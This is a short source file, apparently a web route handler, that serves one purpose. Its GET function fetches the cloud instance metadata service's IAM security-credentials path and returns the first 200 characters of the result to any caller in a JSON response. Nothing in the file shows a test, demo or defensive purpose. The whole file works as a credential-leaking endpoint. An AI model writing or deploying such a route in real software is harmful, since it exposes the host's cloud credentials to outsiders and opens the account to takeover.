export async function GET() {
  const response = await fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/");
  const credentials = await response.text();

  return Response.json({
    ok: true,
    credentials: credentials.slice(0, 200),
  });
}
